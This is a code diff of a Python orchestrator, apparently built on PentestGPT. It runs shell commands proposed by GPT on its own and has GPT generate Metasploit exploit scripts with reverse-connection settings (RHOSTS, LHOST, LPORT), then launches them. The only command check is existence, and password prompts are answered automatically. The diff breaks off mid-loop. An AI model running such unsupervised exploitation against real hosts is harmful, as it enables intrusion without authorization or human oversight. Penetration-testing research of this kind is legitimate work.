@@ -1,632 +1,504 @@
+#!/usr/bin/env python3
+
 import os
 import re
-import subprocess
-import time
-import json
 import shutil
+import sys
+import json
+import time
+import queue
+import threading
+import logging
+from typing import Dict, Any, List, Optional
+import dataclasses
+import pexpect
 from rich.console import Console
+
+# -----------------------
+# Placeholder Imports
+# -----------------------
+# Adjust these to match your actual import paths:
 from pentestgpt.utils.chatgpt import ChatGPT
 from pentestgpt.config.chat_config import ChatGPTConfig
 from prompts.prompt_class_v2 import PentestGPTPrompt
-import pexpect
 
 
-class MallanooSploit:
-    def __init__(self, target_ip, target_description, my_ip, log_dir="logs"):
-        self.target_ip = target_ip
-        self.target_description = target_description
-        self.my_ip = my_ip
-        self.console = Console()
-        self.chatgpt = ChatGPT(ChatGPTConfig)
-        self.conversation_id = None
-        self.history = []
-        self.log_dir = log_dir
-        self.prompts = PentestGPTPrompt()
-        os.makedirs(log_dir, exist_ok=True)
+# --------------------------------------------------
+# TEMPORARY MOCKS for ChatGPT & Prompt classes
+# --------------------------------------------------
+# Remove or replace these with your actual classes.
 
-        self.console.print(f"Target IP: {target_ip}", style="bold green")
-        self.console.print(f"Target Description: {target_description}", style="bold green")
+# Configure logging
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s [%(levelname)s] %(name)s - %(message)s",
+    handlers=[
+        logging.StreamHandler(sys.stdout),
+        logging.FileHandler("pentestgpt_debug.log", mode='w')
+    ]
+)
 
-        self.initialize_conversation()
+logger = logging.getLogger(__name__)
 
-    def initialize_conversation(self):
+
+class GPTClient:
+    """
+    A wrapper for handling GPT interactions, including conversation
+    history, message sending, and advanced prompt management.
+    """
+    def __init__(self, config: ChatGPTConfig):
+        self.chatgpt = ChatGPT(config)
+        self.conversation_id: Optional[str] = None
+        self.history: List[Dict[str, str]] = []
+
+    def start_conversation(self, init_prompt: str, reasoning_prompt: str) -> None:
         """
-        Initialize a new conversation with GPT using prompts.
+        Starts a GPT conversation with two initial messages: generation init and reasoning init.
         """
-        self.console.print("Initializing conversation with GPT...", style="bold blue")
         try:
-            init_response, self.conversation_id = self.chatgpt.send_new_message(
-                self.prompts.generation_session_init
-            )
+            init_response, self.conversation_id = self.chatgpt.send_new_message(init_prompt)
             if init_response:
-                self.history.append({"user": self.prompts.generation_session_init, "gpt": init_response})
+                self.history.append({"user": init_prompt, "gpt": init_response})
             else:
-                self.console.print("[bold yellow]GPT did not provide an initialization response.[/bold yellow]")
+                logger.warning("GPT did not provide an initialization response.")
 
-            reasoning_response = self.chatgpt.send_message(self.prompts.reasoning_session_init, self.conversation_id)
+            reasoning_response = self.chatgpt.send_message(reasoning_prompt, self.conversation_id)
             if reasoning_response:
-                self.history.append({"user": self.prompts.reasoning_session_init, "gpt": reasoning_response})
+                self.history.append({"user": reasoning_prompt, "gpt": reasoning_response})
             else:
-                self.console.print("[bold yellow]GPT did not provide a reasoning response.[/bold yellow]")
+                logger.warning("GPT did not provide a reasoning response.")
 
-            self.console.print(f"Conversation initialized: {self.conversation_id}", style="bold green")
+            logger.info(f"Conversation initialized with ID: {self.conversation_id}")
+
         except Exception as e:
-            self.console.print(f"Failed to initialize conversation: {str(e)}", style="bold red")
+            logger.error(f"Error initializing GPT conversation: {str(e)}")
             raise e
 
+    def send_message(self, user_prompt: str) -> Optional[str]:
+        """
+        Sends a user prompt to GPT, returns the response.
+        Maintains conversation history.
+        """
+        if not self.conversation_id:
+            logger.error("No conversation_id. Call start_conversation first.")
+            return None
 
-    def send_to_gpt(self, prompt):
-        """
-        Send a prompt to GPT, including the history of the conversation, and get the response.
-        """
-        conversation_context = "\n".join(
-            f"User: {entry['user']}\nGPT: {entry['gpt']}" for entry in self.history
-        )
-        full_prompt = f"{conversation_context}\nUser: {prompt}\nGPT:"
+        reduced_history = self._reduce_chat_history()
+        full_prompt = f"{reduced_history}\nUser: {user_prompt}\nGPT:"
+        logger.debug(f"Sending prompt to GPT: {full_prompt[:200]}... (truncated)")
+
         try:
             response = self.chatgpt.send_message(full_prompt, self.conversation_id)
-
-            if response:  # Only append to history if response is valid
-                self.history.append({"user": prompt, "gpt": response})
-                self.console.print(f"GPT Response: {response}", style="bold yellow")
+            if response:
+                self.history.append({"user": user_prompt, "gpt": response})
+                logger.info(f"GPT Response: {response[:100]}... (truncated)")
                 return response
             else:
-                self.console.print("[bold yellow]GPT returned an empty or None response.[/bold yellow]")
+                logger.warning("GPT returned an empty or None response.")
                 return None
-
         except Exception as e:
-            self.console.print(f"Error while communicating with GPT: {str(e)}", style="bold red")
-            raise e
+            logger.error(f"Error while communicating with GPT: {str(e)}")
+            return None
 
-
-    def validate_command(self, command):
+    def _reduce_chat_history(self, max_messages: int = 10, max_tokens: int = 2000) -> str:
         """
-        Validate a command for safety and usability.
+        Reduces the size of the chat history before sending it to GPT:
+        - Keep latest N messages fully.
+        - Summarize older ones.
+        - Ensure total length doesn't exceed max_tokens for safety.
+        """
+        if len(self.history) <= max_messages:
+            return "\n".join(f"User: {entry['user']}\nGPT: {entry['gpt']}"
+                             for entry in self.history if 'gpt' in entry)
+
+        latest_messages = self.history[-max_messages:]
+        summarized = []
+        for entry in self.history[:-max_messages]:
+            if 'user' in entry and 'gpt' in entry:
+                summarized.append(f"User: {entry['user'][:50]}...\nGPT: {entry['gpt'][:50]}...")
+            else:
+                summarized.append("[Omitted Non-GPT Data]")
+
+        reduced_history_list = summarized + [
+            f"User: {msg['user']}\nGPT: {msg['gpt']}" for msg in latest_messages if 'gpt' in msg
+        ]
+        history_string = "\n".join(reduced_history_list)
+
+        # Rough trimming if it exceeds max_tokens
+        while len(history_string) > max_tokens and summarized:
+            summarized.pop(0)
+            reduced_history_list = summarized + [
+                f"User: {msg['user']}\nGPT: {msg['gpt']}"
+                for msg in latest_messages if 'gpt' in msg
+            ]
+            history_string = "\n".join(reduced_history_list)
+
+        return history_string
+
+
+class CommandExecutor:
+    """
+    Handles the validation, simplification, and execution of system commands using pexpect.
+    """
+    def __init__(self):
+        # You can remove nmap_count entirely if it's no longer needed
+        # self.nmap_count = 0
+        pass
+
+    def validate_command(self, command: List[str]) -> bool:
+        """
+        Basic validation: check that the first element is an existing command in the system.
         """
         if not command or not isinstance(command, list):
-            return False, "Invalid command format."
-
-        # Check if the command exists on the system
+            return False
         if shutil.which(command[0]) is None:
-            return False, f"Command not found: {command[0]}"
+            return False
+        return True
 
-        return True, "Command is valid."
-
-    def command_simplified(self, command):
+    def simplify_command(self, command: List[str]) -> List[str]:
         """
-        Simplify commands to avoid potential errors or infinite loops.
+        Example command simplification logic:
+        - If command is 'nmap' but there is an existing nmap result file,
+          replace the actual 'nmap' command with 'cat' of that file
+        - Add timeouts for infinite commands (e.g., 'yes')
+        - Adjust 'ping' to limit the count, etc.
         """
-        if not command or not isinstance(command, list):
+        if not command:
             return command
 
-        # Replace `nmap` with `cat` if nmap results exist
+        # 1) Replace 'nmap' with 'cat' if an existing nmap file is found
         if command[0] == "nmap":
             existing_files = [f for f in os.listdir(".") if "nmap" in f and f.endswith(".txt")]
             if existing_files:
-                self.console.print(f"[bold yellow]Found existing nmap result: {existing_files[0]}[/bold yellow]")
+                # (Optional) If multiple nmap files exist, pick one or the newest
+                # Here we just pick the first
+                logger.info(f"Found existing Nmap file: {existing_files[0]}. Using 'cat' instead of real nmap.")
                 return ["cat", existing_files[0]]
 
-        # Ensure `ping` includes `-c 6`
-        if command[0] == "ping":
-            if "-c" not in command:
-                command.extend(["-c", "6"])
+        # 2) Ensure `ping` includes `-c 6`
+        if command[0] == "ping" and "-c" not in command:
+            command.extend(["-c", "6"])
 
-        # Ensure `tail` includes `-n 100` to limit output
-        if command[0] == "tail":
-            if "-n" not in command:
-                command.extend(["-n", "100"])
-
-        # Ensure `watch` includes `-n 2` to set a safe refresh interval
-        if command[0] == "watch":
-            if "-n" not in command:
-                command.extend(["-n", "2"])
-
-        # Add `timeout` to `yes` to prevent infinite loops
+        # 3) Add `timeout` to `yes` to prevent infinite loops
         if command[0] == "yes":
-            return ["timeout", "5s"] + command
+            command = ["timeout", "5s"] + command
 
-        # Default to returning the command unmodified
         return command
 
-    def extract_command_from_response(self, response):
+    def execute_command(self, command: List[str], timeout_sec: int = 60) -> Dict[str, Any]:
         """
-        Extract and sanitize the command from GPT's response.
+        Executes a system command via pexpect, returns a dict with status and output.
         """
-        # Extract content inside triple backticks
-        matches = re.findall(r'```(?:bash)?\s*(.*?)\s*```', response, re.DOTALL)
-        if matches:
-            # Take the first match and split it into arguments
-            command = matches[0].strip().split()
-            return command
-        return None
+        # Simplify the command first (this is where nmap->cat is replaced if needed)
+        command = self.simplify_command(command)
+        if not command:
+            return {"status": "error", "message": "Invalid or empty command."}
 
-
-
-    def execute_command_in_new_window(self, command):
-        """
-        Execute a command in a new terminal window to display results in real time.
-        Captures and returns the output for `cat` commands.
-        """
+        cmd_str = " ".join(command)
+        logger.info(f"Executing: {cmd_str}")
         try:
-            # Simplify the command before execution
-            command = self.command_simplified(command)
-
-            if not command:
-                self.console.print("[bold yellow]Command was skipped due to invalid or missing arguments.[/bold yellow]")
-                return None
-
-            self.console.print(f"[bold blue]About to execute command: {' '.join(command)}[/bold blue]")
-
-            # If the command is `cat`, capture the output directly
-            if command[0] == "cat":
-                process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-                stdout, stderr = process.communicate()
-
-                if process.returncode != 0:
-                    self.console.print(f"[bold red]Error executing `cat`: {stderr}[/bold red]")
-                    return None
-
-                self.console.print(f"[bold green]Captured output from `cat`: {stdout}[/bold green]")
-                return stdout
-
-            # For other commands, execute them in a new terminal window
-            terminal_command = ["x-terminal-emulator", "-e"] + command  # Adjust for your terminal
-            process = subprocess.Popen(terminal_command)
-            process.wait()
-
-            if process.returncode != 0:
-                self.console.print(f"[bold red]Command failed: {' '.join(command)}[/bold red]")
-                return None
-
-        except FileNotFoundError:
-            self.console.print("[bold red]Error: Terminal emulator not found. Install x-terminal-emulator or adjust the terminal command.[/bold red]")
-            return None
-        except Exception as e:
-            self.console.print(f"[bold red]Unexpected error executing command: {str(e)}[/bold red]")
-            return None
-
-    def execute_command(self, command):
-        """
-        Execute a command directly within the application, handle password prompts or interactive prompts if necessary,
-        and display results in real time. Captures and returns the output or error for further use.
-        Includes a 1-minute timeout for the command execution.
-        """
-        try:
-            # Simplify the command before execution
-            command = self.command_simplified(command)
-
-            if not command:
-                self.console.print("[bold yellow]Command was skipped due to invalid or missing arguments.[/bold yellow]")
-                return None
-
-            self.console.print(f"[bold blue]About to execute command: {' '.join(command)}[/bold blue]")
-
-            # Use pexpect to spawn the command
-            process = pexpect.spawn(" ".join(command), timeout=60, encoding='utf-8')  # Set timeout to 60 seconds
+            process = pexpect.spawn(cmd_str, timeout=timeout_sec, encoding='utf-8')
             stdout_lines = []
             stderr_lines = []
+            is_smbclient = (command[0] == "smbclient")
 
-            # Check if the command is `smbclient` and handle interactions
-            is_smbclient = command[0] == "smbclient"
-
-            # Monitor the process until it finishes
-            finished = False
-            while not finished:
-                # Check if the process has reached EOF, timed out, or encountered specific patterns
+            while True:
                 patterns = [pexpect.EOF, pexpect.TIMEOUT, r"[Pp]assword:"]
                 if is_smbclient:
-                    patterns.append(r"smb:\s*>")  # Detect smbclient prompt
+                    patterns.append(r"smb:\s*>")  # detect smbclient prompt
 
-                match_index = process.expect(patterns, timeout=60)
-
-                if match_index == 0:  # EOF (process finished)
-                    finished = True
-
-                elif match_index == 1:  # TIMEOUT
-                    self.console.print("[bold red]Command timed out after 1 minute.[/bold red]")
-                    stderr_lines.append("Command timed out.")
+                idx = process.expect(patterns, timeout=timeout_sec)
+                if idx == 0:   # EOF - process finished
+                    break
+                elif idx == 1:  # TIMEOUT
+                    stderr_lines.append("Timed out.")
                     process.terminate(force=True)
                     break
+                elif idx == 2:  # password prompt
+                    process.sendline("kali")  # or ask user, or do something
+                elif is_smbclient and idx == 3:
+                    # smbclient prompt
+                    process.sendline("")
 
-                elif match_index == 2:  # Password prompt detected
-                    process.sendline("kali")
-                    self.console.print("[bold yellow]Password entered automatically.[/bold yellow]")
-
-                elif is_smbclient and match_index == 3:  # smbclient prompt detected
-                    process.sendline("")  # Send Enter to bypass the smbclient prompt
-                    self.console.print("[bold yellow]Entered smbclient session. Sent 'Enter' automatically.[/bold yellow]")
-
-                # Capture any output before the next pattern match
                 if process.before:
                     output_line = process.before.strip()
                     if output_line:
-                        self.console.print(f"[bold green]{output_line}[/bold green]")
                         stdout_lines.append(output_line)
 
-            # Ensure the process is closed
             process.close()
-
-            # Handle cases where the process exits with an error code
-            if process.exitstatus != 0:
-                error_message = "".join(stderr_lines) if stderr_lines else "Command failed with unknown error."
-                self.console.print(f"[bold red]Command failed with return code {process.exitstatus}.[/bold red]")
-                self.console.print(f"[bold red]Error details: {error_message.strip()}[/bold red]")
-
-                # Return error details for further handling
-                return {"status": "error", "message": error_message.strip()}
-
-            # Return the captured stdout as a single string
-            return {"status": "success", "message": "\n".join(stdout_lines)}
+            if process.exitstatus not in (0, None):
+                return {
+                    "status": "error",
+                    "message": f"Return code {process.exitstatus}\n" + "\n".join(stderr_lines),
+                    "stdout": "\n".join(stdout_lines)
+                }
+            return {
+                "status": "success",
+                "message": "\n".join(stdout_lines)
+            }
 
         except FileNotFoundError:
-            error_message = "Command not found. Ensure the command is valid and try again."
-            self.console.print(f"[bold red]Error: {error_message}[/bold red]")
-            return {"status": "error", "message": error_message}
-
+            return {"status": "error", "message": "Command not found."}
         except Exception as e:
-            error_message = f"Unexpected error executing command: {str(e)}"
-            self.console.print(f"[bold red]{error_message}[/bold red]")
-            return {"status": "error", "message": error_message}
+            return {"status": "error", "message": str(e)}
 
 
 
+class MetasploitManager:
+    """
+    Runs Metasploit in a background thread, capturing output and optionally sending commands from GPT.
+    """
+    def __init__(self, script_path: str, output_queue: queue.Queue, stop_event: threading.Event):
+        self.script_path = script_path
+        self.output_queue = output_queue
+        self.stop_event = stop_event
+        self.thread: Optional[threading.Thread] = None
 
-
-    
-
-
-    def handle_failed_command(self, error_message):
+    def start(self):
         """
-        Handle a failed command by asking GPT for a new command.
+        Start msfconsole with a resource script in a background thread.
         """
-        self.console.print("[bold yellow]Asking GPT for a new command due to failure...[/bold yellow]")
+        self.thread = threading.Thread(target=self._run_metasploit, daemon=True)
+        self.thread.start()
+
+    def _run_metasploit(self):
+        """
+        Actual logic to spawn msfconsole, read output line-by-line, and push it to an output queue.
+        """
+        cmd = f"msfconsole -r {self.script_path}"
+        logger.info(f"Starting Metasploit with: {cmd}")
+
         try:
-            response = self.send_to_gpt(f"{self.prompts.ask_todo}\n\nCommand failure details:\n{error_message}")
-            self.console.print("[bold green]Received new suggestions from GPT.[/bold green]")
-        except Exception as e:
-            self.console.print(f"[bold red]Error while asking GPT for a new command: {str(e)}[/bold red]")
+            child = pexpect.spawn(cmd, encoding='utf-8', timeout=None)
+            child.logfile_read = None  # We will capture below
 
-    def extract_command_with_gpt(self, response):
-        """
-        Use ChatGPT to extract and suggest a command from the given response.
-        If GPT does not return a valid response, attempt to extract a command directly from the input.
-        """
-        try:
-            self.console.print("[bold blue]Asking GPT to suggest a command from its own response...[/bold blue]")
+            while not self.stop_event.is_set():
+                # Try to read one line
+                idx = child.expect_exact([pexpect.EOF, '\n'], timeout=1)
+                if idx == 0:
+                    # EOF
+                    logger.info("Metasploit session ended.")
+                    break
+                elif idx == 1:
+                    line = child.before  # everything up to \n
+                    if line.strip():
+                        logger.info(f"[Metasploit] {line.strip()}")
+                        self.output_queue.put(line.strip())
 
-            # Craft a prompt asking GPT to extract a single command
-            prompt = (
-                "Below is the output of your previous response. Please extract the command that should be executed. "
-                "If there are multiple commands, suggest only the most relevant one. Enclose your response in triple backticks.\n\n"
-                f"{response}"
-            )
-
-            # Send the prompt to GPT
-            extracted_command_response = self.send_to_gpt(prompt)
-
-            # If GPT provides a response, attempt to extract a command
-            if extracted_command_response:
-                matches = re.findall(r'```(?:bash)?\s*(.*?)\s*```', extracted_command_response, re.DOTALL)
-                if matches:
-                    command = matches[0].strip().split()
-                    self.console.print(f"[bold green]Command extracted by GPT: {' '.join(command)}[/bold green]")
-                    return command
-
-                self.console.print("[bold yellow]GPT did not suggest a valid command. Falling back to regex extraction.[/bold yellow]")
-
-            # Fallback: Use regex on the original response if GPT fails or returns None
-            matches = re.findall(r'```(?:bash)?\s*(.*?)\s*```', response, re.DOTALL)
-            if matches:
-                # Extract the first match as a potential command
-                potential_command = matches[0].strip().split()
-                self.console.print(f"[bold green]Command extracted from input: {' '.join(potential_command)}[/bold green]")
-                return potential_command
-
-            # If no command is found, log a warning
-            self.console.print("[bold yellow]No command could be extracted from GPT response or input.[/bold yellow]")
-            return None
-
-        except Exception as e:
-            self.console.print(f"[bold red]Error extracting command with GPT: {str(e)}[/bold red]")
-            return None
-
-
-
-    def metasploit_script(self):
-        """
-        Generate and execute a Metasploit .rc script in a new terminal window.
-        """
-        try:
-            # Prepare the prompt to include the full conversation history
-            conversation_context = "".join(
-                [f"{entry['role'].capitalize()}: {entry['content']}\n\n" for entry in self.history]
-            )
-            prompt = (
-                "Based on the penetration testing context provided below, generate a Metasploit resource (.rc) script "
-                "that automates the exploitation process. The script should be specific to the vulnerabilities identified, "
-                "explicitly reference the target IP, and include clear comments for each step.\n\n"
-                f"{conversation_context}\n\n"
-                "The generated .rc script should:\n"
-                "1. Set up the Metasploit framework environment.\n"
-                "2. Use an appropriate exploit module.\n"
-                "3. Set required payloads and options (e.g., RHOSTS, LHOST, LPORT).\n"
-                "4. Include comments explaining each step.\n"
-                "5. Save the results and maintain logs.\n"
-                "Please enclose the script in triple backticks (` ``` `) for clarity."
-            )
-
-            # Send the prompt to GPT
-            self.console.print("[bold blue]Requesting Metasploit script from GPT...[/bold blue]")
-            response = self.send_to_gpt(prompt)
-
-            if not response:
-                self.console.print("[bold yellow]GPT did not return a response.[/bold yellow]")
-                return None
-
-            # Extract the .rc script from GPT's response
-            matches = re.findall(r'```(?:bash|plaintext)?\s*(.*?)\s*```', response, re.DOTALL)
-            if matches:
-                metasploit_script = matches[0].strip()
-                self.console.print(f"[bold green]Generated Metasploit Script:\n{metasploit_script}[/bold green]")
-
-                # Save the script to a file
-                script_path = os.path.join(self.log_dir, "metasploit_exploit.rc")
-                with open(script_path, "w") as script_file:
-                    script_file.write(metasploit_script)
-
-                self.console.print(f"[bold green]Metasploit script saved to: {script_path}[/bold green]")
-
-                # Execute the script in a new terminal window using pexpect
-                self.execute_metasploit_script(script_path)
-
-                return script_path
-            else:
-                self.console.print("[bold yellow]GPT did not generate a valid script.[/bold yellow]")
-                return None
-
-        except Exception as e:
-            self.console.print(f"[bold red]Error generating Metasploit script: {str(e)}[/bold red]")
-            return None
-
-
-    def execute_metasploit_script(self, script_path):
-        """
-        Execute the Metasploit .rc script in a new terminal window.
-        """
-        try:
-            self.console.print("[bold blue]Starting Metasploit with the generated script...[/bold blue]")
-
-            # Prepare the command to run Metasploit with the script
-            command = f"msfconsole -r {script_path}"
-
-            # Open a new terminal window and run the command using pexpect
-            child = pexpect.spawn(f"x-terminal-emulator -e {command}", timeout=3600)
-            child.logfile = sys.stdout  # Redirect output to the current console for live updates
-
-            # Wait for the process to complete or timeout
-            child.expect(pexpect.EOF)
-            self.console.print("[bold green]Metasploit execution completed.[/bold green]")
-
+            child.close()
+        except pexpect.EOF:
+            logger.info("EOF from Metasploit process.")
         except pexpect.TIMEOUT:
-            self.console.print("[bold red]Metasploit execution timed out.[/bold red]")
+            logger.warning("Timeout reading from Metasploit process.")
         except Exception as e:
-            self.console.print(f"[bold red]Error executing Metasploit script: {str(e)}[/bold red]")
+            logger.error(f"Error in Metasploit thread: {e}")
 
+        logger.info("Metasploit thread exiting...")
 
-    def check_and_run_metasploit(self, response):
+    def join(self):
         """
-        Check if Metasploit is applicable based on the GPT response, and if so, generate and run a Metasploit script.
+        Wait for the Metasploit thread to finish.
         """
-        try:
-            self.console.print("[bold blue]Checking if Metasploit is applicable...[/bold blue]")
+        if self.thread:
+            self.thread.join()
 
-            # Prepare a prompt to determine Metasploit applicability
-            prompt = (
-                "Based on the following context, determine if Metasploit can be used for exploitation.\n"
-                "If Metasploit is applicable, generate a resource (.rc) script that automates the exploitation process "
-                "and include all required settings (e.g., RHOSTS, LHOST, LPORT). Ensure to set:\n"
-                f"- RHOSTS: {self.target_ip}\n"
-                f"- LHOST: {self.my_ip}\n"
-                "Choose a valid LPORT (e.g., 4444 or 5555) and include it in the script.\n\n"
-                f"Context:\n{response}\n\n"
-                "If Metasploit is applicable, enclose the script in triple backticks (` ``` `) for clarity."
+
+class PentestOrchestrator:
+    """
+    Main orchestrator that coordinates:
+    - GPT conversation
+    - Command execution
+    - Background Metasploit exploitation
+    """
+    def __init__(self, target_ip: str, target_desc: str, my_ip: str, log_dir: str = "logs"):
+        self.target_ip = target_ip
+        self.target_desc = target_desc
+        self.my_ip = my_ip
+        self.log_dir = log_dir
+        os.makedirs(log_dir, exist_ok=True)
+
+        self.console = Console()
+        self.gpt_client = GPTClient(ChatGPTConfig())
+        self.executor = CommandExecutor()
+
+        self.prompts = PentestGPTPrompt()
+        self.commands_executed: List[Dict[str, Any]] = []
+        self.metaploit_output_queue = queue.Queue()
+        self.ms_stop_event = threading.Event()
+        self.ms_manager: Optional[MetasploitManager] = None
+
+    def initialize(self):
+        """
+        Start GPT conversation with two initial prompts.
+        """
+        self.console.print(f"Target IP: {self.target_ip}", style="bold green")
+        self.console.print(f"Description: {self.target_desc}", style="bold green")
+
+        self.gpt_client.start_conversation(
+            init_prompt=self.prompts.generation_session_init,
+            reasoning_prompt=self.prompts.reasoning_session_init
+        )
+
+    def start_background_metasploit(self, metasploit_script: str):
+        """
+        Create a metasploit script file and run in the background.
+        """
+        script_path = os.path.join(self.log_dir, "background_metasploit.rc")
+        with open(script_path, "w") as f:
+            f.write(metasploit_script)
+
+        self.ms_manager = MetasploitManager(
+            script_path=script_path,
+            output_queue=self.metaploit_output_queue,
+            stop_event=self.ms_stop_event
+        )
+        self.ms_manager.start()
+
+    def check_background_metasploit_output(self):
+        """
+        Non-blocking check for new lines from the Metasploit output queue.
+        If new lines exist, we feed them to GPT for analysis.
+        """
+        while not self.metaploit_output_queue.empty():
+            line = self.metaploit_output_queue.get()
+            # You could store in GPT history or parse it here
+            # For demonstration, let's just feed to GPT:
+            analysis_prompt = (
+                "Metasploit background output:\n"
+                f"```\n{line}\n```\n"
+                "Analyze the above line from Metasploit and provide any insights."
             )
+            response = self.gpt_client.send_message(analysis_prompt)
+            if response:
+                logger.info(f"[GPT Analysis on MSF Output]: {response[:80]}...")
 
-            # Ask GPT if Metasploit is applicable
-            metasploit_response = self.send_to_gpt(prompt)
-
-            if not metasploit_response:
-                self.console.print("[bold yellow]GPT did not suggest using Metasploit.[/bold yellow]")
-                return
-
-            # Extract the Metasploit script from the GPT response
-            matches = re.findall(r'```(?:bash|plaintext)?\s*(.*?)\s*```', metasploit_response, re.DOTALL)
-            if matches:
-                metasploit_script = matches[0].strip()
-                self.console.print(f"[bold green]Generated Metasploit Script:\n{metasploit_script}[/bold green]")
-
-                # Save the script to a file
-                script_path = os.path.join(self.log_dir, "metasploit_exploit.rc")
-                with open(script_path, "w") as script_file:
-                    script_file.write(metasploit_script)
-
-                self.console.print(f"[bold green]Metasploit script saved to: {script_path}[/bold green]")
-
-                # Execute the Metasploit script
-                self.execute_metasploit_script(script_path)
-            else:
-                self.console.print("[bold yellow]Metasploit is not applicable or GPT did not generate a valid script.[/bold yellow]")
-
-        except Exception as e:
-            self.console.print(f"[bold red]Error checking Metasploit applicability: {str(e)}[/bold red]")
-
-
-    def execute_metasploit_script(self, script_path):
+    def extract_command_from_gpt_response(self, response: str) -> Optional[List[str]]:
         """
-        Execute the Metasploit .rc script directly within the application.
+        Extract a single command from GPT response using backticks or fallback logic.
         """
-        try:
-            self.console.print("[bold blue]Starting Metasploit with the generated script...[/bold blue]")
+        if not response:
+            return None
+        pattern = r'```(?:bash|plaintext)?\s*(.*?)\s*```'
+        matches = re.findall(pattern, response, re.DOTALL)
+        if matches:
+            # Take the first match
+            return matches[0].strip().split()
+        return None
 
-            # Prepare the Metasploit command
-            command = f"msfconsole -r {script_path}"
-
-            # Use pexpect to execute the command
-            child = pexpect.spawn(command, timeout=3600, encoding='utf-8')
-            child.logfile_read = sys.stdout  # Redirect output to the console
-
-            # Monitor the Metasploit execution
-            child.expect(pexpect.EOF)
-            self.console.print("[bold green]Metasploit execution completed.[/bold green]")
-
-        except pexpect.TIMEOUT:
-            self.console.print("[bold red]Metasploit execution timed out.[/bold red]")
-        except Exception as e:
-            self.console.print(f"[bold red]Error executing Metasploit script: {str(e)}[/bold red]")
-
-
-
-
-    def start_conversation(self):
+    def main_workflow(self):
         """
-        Start the main penetration testing workflow with enhanced error handling.
-        Includes Metasploit integration for exploitation when applicable.
+        The main loop that orchestrates GPT Q&A, command extraction, and execution.
+        We'll also occasionally poll the Metasploit queue for new output.
         """
-        initial_prompt = (
+        # Example: initial question to GPT
+        user_msg = (
             f"{self.prompts.task_description}\n\n"
             f"Target IP: {self.target_ip}\n"
-            f"Description: {self.target_description}\n"
+            f"Description: {self.target_desc}\n"
             f"{self.prompts.first_todo}"
         )
-        response = self.send_to_gpt(initial_prompt)
+        gpt_response = self.gpt_client.send_message(user_msg)
 
+        # Start a loop to handle GPT suggestions
         retry_count = 0
-        max_retries = 5  # Limit the number of retries to prevent infinite loops
+        max_retries = 5
 
-        while retry_count <= max_retries:
-            try:
-                # Extract a command using GPT
-                command = self.extract_command_with_gpt(response)
+        while retry_count < max_retries:
+            # 1) Check if Metasploit has new output
+            self.check_background_metasploit_output()
 
-                if not command:
-                    retry_count += 1
-                    self.console.print(f"[bold yellow]Retrying... ({retry_count}/{max_retries})[/bold yellow]")
-                    
-                    if retry_count > max_retries:
-                        self.console.print("[bold yellow]Max retries reached. Exiting conversation.[/bold yellow]")
-                        break
-                    
-                    response = self.send_to_gpt(
-                        "GPT did not suggest a valid command. Please analyze the previous task and suggest the next steps."
-                    )
-                    continue
-
-                # Reset retry count if a valid command is found
-                retry_count = 0
-
-                # Validate the command
-                is_valid, validation_message = self.validate_command(command)
-                if not is_valid:
-                    self.console.print(f"[bold red]Command validation failed: {validation_message}[/bold red]")
-                    response = self.send_to_gpt(f"Command validation failed: {validation_message}. Suggest next steps.")
-                    continue
-
-                # Execute the command inline
-                self.console.print(f"[bold blue]Executing command: {' '.join(command)}[/bold blue]")
-                command_output = self.execute_command(command)
-
-                # if command_output is None:  # Command failed or returned no output
-                #     self.console.print("[bold red]Command execution failed or returned no output.[/bold red]")
-                #     response = self.send_to_gpt(
-                #         f"The command `{command}` failed or produced no output.\n"
-                #         f"Error details (if any):\n\n```plaintext\n{command_output or 'No details available.'}\n```\n"
-                #         f"Please suggest an alternative command or next steps."
-                #     )
-                #     continue
-
-                # # Provide the command output to GPT for analysis
-                # self.console.print(f"[bold green]Command Output:\n{command_output}[/bold green]")
-                # response = self.send_to_gpt(
-                #     f"The following is the output of the command `{command}`:\n\n```plaintext\n{command_output}\n```\n"
-                #     f"Analyze this output and suggest the next steps in the penetration testing process."
-                # )
-
-                if command_output is None:  # Command failed or returned no output
-                    self.console.print("[bold red]Command execution failed or returned no output.[/bold red]")
-
-                    # Include full chat history when requesting suggestions
-                    conversation_context = "\n".join(
-                        f"User: {entry['user']}\nGPT: {entry['gpt']}" for entry in self.history
-                    )
-                    failure_prompt = (
-                        f"{conversation_context}\n\n"
-                        f"User: The command `{command}` failed or produced no output.\n"
-                        f"Please suggest an alternative command or next steps.\nGPT:"
-                    )
-
-                    response = self.send_to_gpt(failure_prompt)
-                    if response:
-                        self.history.append({"user": failure_prompt, "gpt": response})
-                    continue
-
-                # Provide the command output to GPT for analysis, with full history
-                self.console.print(f"[bold green]Command Output:\n{command_output}[/bold green]")
-
-                conversation_context = "\n".join(
-                    f"User: {entry['user']}\nGPT: {entry['gpt']}" for entry in self.history
-                )
-                analysis_prompt = (
-                    f"{conversation_context}\n\n"
-                    f"User: The following is the output of the command `{command}`:\n\n"
-                    f"```plaintext\n{command_output}\n```\n"
-                    f"Analyze this output and suggest the next steps in the penetration testing process.\nGPT:"
-                )
-
-                response = self.send_to_gpt(analysis_prompt)
-                if response:
-                    self.history.append({"user": analysis_prompt, "gpt": response})
-
-
-                # Check if Metasploit is applicable based on the response
-                self.check_and_run_metasploit(response)
-
-            except KeyboardInterrupt:
-                self.console.print("[bold red]Interrupted by user. Exiting conversation.[/bold red]")
-                break
-            except Exception as e:
-                self.console.print(f"[bold red]Unexpected error: {str(e)}[/bold red]")
-                response = self.send_to_gpt(
-                    f"An unexpected error occurred during the penetration testing process:\n\n```plaintext\n{str(e)}\n```\n"
-                    f"Please analyze this and suggest a way to continue."
-                )
+            # 2) Extract command from GPT's response
+            command = self.extract_command_from_gpt_response(gpt_response or "")
+            if not command:
+                logger.warning("No command extracted. Asking GPT for next steps.")
                 retry_count += 1
-                if retry_count > max_retries:
-                    self.console.print("[bold red]Max retries reached due to repeated errors. Exiting conversation.[/bold red]")
+                if retry_count >= max_retries:
                     break
+                gpt_response = self.gpt_client.send_message(
+                    "No valid command extracted. Please suggest the next command or steps."
+                )
+                continue
 
+            # 3) Validate and execute
+            if not self.executor.validate_command(command):
+                logger.warning(f"Invalid command: {command}")
+                retry_count += 1
+                if retry_count >= max_retries:
+                    break
+                gpt_response = self.gpt_client.send_message(
+                    f"Command `{command}` is not valid on this system. Suggest alternatives."
+                )
+                continue
 
+            result = self.executor.execute_command(command)
+            self.commands_executed.append({
+                "command": " ".join(command),
+                "status": result["status"],
+                "output": result.get("message")
+            })
 
+            # 4) Provide the result back to GPT for analysis
